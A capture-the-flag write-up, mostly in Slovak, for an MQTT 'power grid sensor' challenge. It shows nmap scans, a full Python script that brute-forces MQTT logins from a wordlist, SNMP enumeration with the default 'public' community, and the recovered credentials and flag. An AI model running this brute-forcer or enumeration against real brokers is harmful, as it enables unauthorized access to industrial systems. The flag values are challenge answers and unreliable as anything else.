# Zadanie

Hi, emergency troubleshooter,

sensor data from the distribution network are being continuously transmitted to `broker.powergrid.tcc`. However, the outsourced provider went bankrupt last week, and no one else has knowledge of how to access these data. Find out how to regain access to the sensor array data.

Stay grounded!

## Riešenie

Ako už zadanie nepovedá, zrejme pôjde o MQTT a bude otvorený port 1883, overím cez nmap. 

```shell
$ nmap -Pn -p 1883 broker.powergrid.tcc
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-20 20:05 CEST
Nmap scan report for broker.powergrid.tcc (10.99.25.50)
Host is up (0.017s latency).
Other addresses for broker.powergrid.tcc (not scanned): 2001:db8:7cc::25:50

PORT     STATE SERVICE
1883/tcp open  mqtt

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
```

Je to tak, ale pri pokuse o pripojenie mi hlási 

```shell
$ mosquitto_sub -h broker.powergrid.tcc -p 1883 -t '#' -v
Connection error: Connection Refused: not authorised.
```

Meno a heslo však neviem, zrejme bude treba brute-forceovať, resp. použiť nejaký slovníkový útok. Najčastejšie používam list common.txt a rockyou.txt. Skúsim menší, common.txt a vzhľadom na to, že neviem ani meno, ani heslo, skúsim najprv tak, že meno aj heslo budú rovnaké.

```python
# mqtt_brute_fixed.py
import time, random, string, sys
from threading import Event
import paho.mqtt.client as mqtt

HOST = "broker.powergrid.tcc"
PORT = 1883
CONNECT_TIMEOUT = 4.0
MSG_WAIT = 2.0
with open("common.txt", "r") as f:
    creds = [line.strip() for line in f if line.strip()]

def try_creds(up):
    connect_event = Event()
    message_event = Event()
    rc_holder = {"rc": None}
    msg_preview = {"topic": None, "payload": None}

    cid = "ctf-" + ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))

    def on_connect(client, userdata, flags, rc):
        rc_holder["rc"] = rc
        if rc == 0:
            client.subscribe("#", qos=0)
        connect_event.set()

    def on_message(client, userdata, msg):
        msg_preview["topic"] = msg.topic
        try:
            msg_preview["payload"] = msg.payload.decode("utf-8", errors="replace")
        except Exception:
            msg_preview["payload"] = repr(msg.payload[:120])
        message_event.set()
        client.disconnect()

    client = mqtt.Client(client_id=cid, protocol=mqtt.MQTTv311, clean_session=True)
    if up:
        client.username_pw_set(up, up)

    client.on_connect = on_connect
    client.on_message = on_message

    try:
        client.connect(HOST, PORT, keepalive=30)
    except Exception as e:
        print(f"[!] Connection error for {up}:{up} -> {e}")
        return False, None

    client.loop_start()
    connected = connect_event.wait(CONNECT_TIMEOUT)
    if not connected:
        client.loop_stop()
        return False, None

    rc = rc_holder["rc"]
    if rc != 0:
        client.loop_stop()
        return False, rc

    got_msg = message_event.wait(MSG_WAIT)
    client.loop_stop()

    if got_msg:
        tp = msg_preview["topic"]
        pl = msg_preview["payload"]
        print(f"[+] SUCCESS {up}:{up} -> sample: {tp} {pl[:200]!r}")
        return True, rc
    else:
        print(f"[i] Auth ok for {up}:{up} (rc={rc}) but no $SYS messages within {MSG_WAIT}s")
        return True, rc

if __name__ == "__main__":
    for name in creds:
        print(f"[*] Trying {name}:{name}")
        ok, rc = try_creds(name)
        if ok:
            print(f"\n[!] WIN: username='{name}' password='{name}' (rc={rc})\n")
            sys.exit(0)
    print("[-] No creds matched.")
```

Skript sa teda podaril, meno aj heslo sú rovnaké, posledné riadky z výstupu sú

```log
...
[*] Trying reader:reader
[+] SUCCESS reader:reader -> sample: sensors/dev3 'TEST{84GL-Fm58-wE4P-rB54}'

[!] WIN: username='reader' password='reader' (rc=0)
```

teraz použijem `mosquitto_sub` a uvidím, čo sa tam publishuje.

```shell
$ mosquitto_sub -h broker.powergrid.tcc -p 1883 -u reader -P reader -t '#' -v
sensors/dev3 TEST{84GL-Fm58-wE4P-rB54}
sensors/dev1 TEST{1vX4-7hk7-a16H-pi45}
sensors/dev2 TEST{bvX2-B8k7-3b6H-MY8p}
sensors/prod FLAG{0hs0-SiJm-TO5B-46HD}
sensors/dev3 TEST{84GL-Fm58-wE4P-rB54}
sensors/dev1 TEST{1vX4-7hk7-a16H-pi45}
sensors/dev2 TEST{bvX2-B8k7-3b6H-MY8p}
```

Vac mi netreba. Vlajka ma vlastný topic, stačí počkať max 4s a vlajka sa objaví.

---------------------

Po odoslaní write-upu autorom mi odpísali

> U úlohy "Sensor array" by Vám pomohlo udělat ještě UDP scan, tam se  
> skrývá nápověda, která by velmi zjednodušila až odstranila nutnost  
> bruteforce.



Vôbec mi to nenapadlo v čase riešenia, dodatočne som teda pozrel a skutočne.

```
$ sudo nmap -Pn -sU --top-ports 10 broker.powergrid.tcc
Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-31 19:15 CET
Nmap scan report for broker.powergrid.tcc (10.99.25.50)
Host is up (0.018s latency).
Other addresses for broker.powergrid.tcc (not scanned): 2001:db8:7cc::25:50

PORT     STATE  SERVICE
53/udp   closed domain
67/udp   closed dhcps
123/udp  closed ntp
135/udp  closed msrpc
137/udp  closed netbios-ns
138/udp  closed netbios-dgm

   161/udp  open   snmp

445/udp  closed microsoft-ds
631/udp  closed ipp
1434/udp closed ms-sql-m

Nmap done: 1 IP address (1 host up) scanned in 5.78 seconds
```

Je tu otvorený udp port 161. Odtrhol som ho pre zvýraznenie.

```
$ snmpwalk -v 2c -c public broker.powergrid.tcc


iso.3.6.1.2.1.1.1.0 = STRING: "MQTT broker for power grid sensors. Only reader has the rights to subscribe to a topic!"
iso.3.6.1.2.1.1.3.0 = Timeticks: (111704874) 12 days, 22\:17\:28.74
iso.3.6.1.2.1.1.5.0 = STRING: "Mosquitto"
iso.3.6.1.2.1.1.6.0 = STRING: "DC A, area 51"
iso.3.6.1.2.1.1.7.0 = INTEGER: 1
iso.3.6.1.2.1.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)

```

Je to skutočne tak, 
`Only reader has the rights to subscribe to a topic!`

Meno používateľa by som mal známe hneď a pravdepodobne by som skúsil rovnaké heslo.

## Vlajka

    FLAG{0hs0-SiJm-TO5B-46HD}
